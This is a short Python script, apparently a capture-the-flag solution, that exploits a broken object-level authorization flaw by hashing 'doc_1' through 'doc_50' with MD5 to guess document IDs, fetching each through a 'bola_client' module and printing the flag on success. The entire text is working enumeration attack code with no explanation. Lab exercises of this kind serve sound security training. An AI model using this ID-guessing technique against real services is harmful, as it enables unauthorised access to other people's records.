import hashlib, bola_client
for i in range(1, 51):
    u = hashlib.md5(f"doc_{i}".encode()).hexdigest()
    res = bola_client.get_doc(u)
    if res["status"] == "success":
        print("Flag:", res["content"])
        break
